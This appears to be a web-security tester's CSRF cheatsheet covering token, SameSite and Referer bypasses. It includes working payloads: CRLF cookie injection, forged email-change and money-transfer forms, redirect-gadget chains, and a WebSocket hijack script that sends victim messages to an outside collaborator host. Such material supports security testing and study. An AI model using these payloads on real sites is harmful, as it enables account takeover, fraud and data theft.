# CSRF Cheatsheet

Quick-reference / test checklist. Assumes you already know the theory (see 21.1–21.4 notes).

---

## 1. Preconditions to check first

- [ ] Action is worth forging (state change, privileged, user-specific)
- [ ] Auth is cookie-only (or Basic/cert-based) — no other binding
- [ ] All params are predictable/guessable (no secret current-password etc.)
- [ ] Check `Set-Cookie` on login response for `SameSite` level + whether CSRF token exists at all

If token exists → go to §2. If `SameSite` is set → go to §3. If only `Referer` check → go to §4.

---

## 2. CSRF token bypass checklist

Test each independently, replaying via Repeater:

| # | Test | How | Vuln if... |
|---|------|-----|------------|
| 2.1 | Method switch | Resend as `GET` instead of `POST` | Token check skipped on `GET` |
| 2.2 | Strip token | Remove the whole `csrf` param (not just value) | Request still accepted |
| 2.3 | Global token pool | Get *your own* valid token, submit it with victim's session | Accepted → tokens aren't session-bound |
| 2.4 | Non-session cookie binding | Swap `csrfKey` cookie + `csrf` body param from account B into account A's request (keep A's `session` cookie) | Accepted → token tied to a side cookie, not `session` |
| 2.5 | Double-submit cookie | Change `csrf` cookie value AND matching body param to any self-chosen value | Accepted → no server-side token store at all |

**2.4 / 2.5 only become exploitable if you also have a cookie-injection primitive** (needed to plant your fabricated cookie in the victim's browser). Look for:
- Any endpoint reflecting input into a `Set-Cookie` header (CRLF injection: `%0d%0a`)
- Cookie-setting bugs on **any sibling subdomain** under the same parent domain — scope just needs to cover the target

**2.4 attack chain:**
1. Log in as attacker → capture `csrfKey` + `csrf`.
2. Use cookie-injection primitive to overwrite victim's `csrfKey` with attacker's.
3. Deliver page with form containing attacker's `csrf` token.
4. Order matters — cookie injection must land *before* form submits:
```html
<img src="https://target/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-KEY%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

**2.5 attack:** fabricate any `csrf` value (matching expected format), plant via cookie-injection bug, embed same value in PoC form. No real token ever needed.

---

## 3. SameSite bypass checklist

Confirm cookie attribute first: `Set-Cookie: session=...; SameSite=Strict|Lax|None`. No attribute = Chrome default `Lax`.

| Cookie level | Bypass path | Requirement |
|---|---|---|
| `Lax` (or default) | §3.1 GET-based | Endpoint accepts state-change via `GET`, or method-override param |
| `Strict` | §3.2 on-site gadget | Same-site client-side redirect that builds URL from attacker-controlled param |
| `Strict`/`Lax` | §3.3 sibling domain | XSS (or any request-forging bug) on *any* subdomain of the same site |
| `Lax` (default only) | §3.4 refresh window | Way to force victim's cookie to re-issue (e.g. OAuth/SSO flow) |

### 3.1 — Lax + GET
```html
<script>document.location='https://target/account/transfer?recipient=hacker&amount=1000000';</script>
```
If endpoint is POST-only, check for method-override params (e.g. Symfony's `_method`):
```html
<form action="https://target/account/transfer-payment" method="GET">
  <input type="hidden" name="_method" value="POST">
  <input type="hidden" name="recipient" value="hacker">
  <input type="hidden" name="amount" value="1000000">
</form>
```

### 3.2 — Strict + on-site redirect gadget
Find a client-side JS redirect that builds its destination from a query param (e.g. `?postId=`). Confirm path traversal works:
```
/post/comment/confirmation?postId=1/../../my-account
```
Chain into the sensitive endpoint (URL-encode `&` so it doesn't break the outer param), confirm target endpoint also accepts `GET`:
```html
<script>
document.location = "https://target/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40evil.com%26submit=1";
</script>
```
Server-side redirects do **not** work for this — only client-side ones bypass SameSite.

### 3.3 — Sibling domain XSS → cross-site request forging
Same-site ≠ same-origin — audit *every* subdomain. Look for `Access-Control-Allow-Origin` headers on static resources revealing sibling domains (e.g. `cms-target.com`). Find XSS there, convert the vulnerable request to `GET`, deliver via top-level navigation to the sibling domain — cookies flow because request originates same-site.

Also check WebSocket handshakes for **CSWSH** (CSRF for WS):
```html
<script>
var ws = new WebSocket('wss://target/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = (event) => fetch('https://collaborator-url', {method:'POST', mode:'no-cors', body: event.data});
</script>
```
Chain sibling-domain XSS as the `username` param to bypass SameSite entirely:
```html
<script>
document.location = "https://cms-target.com/login?username=URL-ENCODED-CSWSH-PAYLOAD&password=anything";
</script>
```

### 3.4 — Lax default 120s grace window (obsoleted, but check legacy stacks)
Only applies to cookies with **no explicit** `SameSite` attribute (Chrome default). Force a fresh cookie issuance (OAuth/SSO login is the reliable trigger), then fire CSRF within 120s. Use a new-tab trick so your original page stays open, triggered from a real click (popup blockers):
```js
window.onclick = () => window.open('https://target/login/sso');
```

---

## 4. Referer-based defense bypass

| Test | Payload | Vuln if... |
|---|---|---|
| Missing header | `<meta name="referrer" content="never">` on exploit page | Check skipped when `Referer` absent |
| "Starts with" check | Host on `http://target.com.attacker.com/csrf` | Naive prefix match passes |
| "Contains" check | `http://attacker.com/csrf-attack?target.com` | Naive substring match passes — but query string is stripped by browsers by default, so force it: |

For the "contains" bypass, force full-URL Referer via response header on your exploit page:
```
Referrer-Policy: unsafe-url
```
Full PoC:
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url

<html>
<body>
<form action="https://target/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
history.pushState('', '', '/?https://target.com');
document.forms[0].submit();
</script>
</body>
</html>
```

---

## 5. PoC generation

Burp Pro: select request → right-click → Engagement tools → Generate CSRF PoC → customize → test while logged in.

GET-based, single-URL (no hosting needed):
```html
<img src="https://target/email/change?email=pwned@evil.com">
```

---

## 6. Quick decision tree

```
Token present? 
 ├─ No → check SameSite → check Referer
 └─ Yes → run §2.1–2.5
           ├─ all fail → check SameSite (§3)
           └─ SameSite=Strict/Lax solid → check Referer (§4) or sibling-domain XSS (§3.3)
```
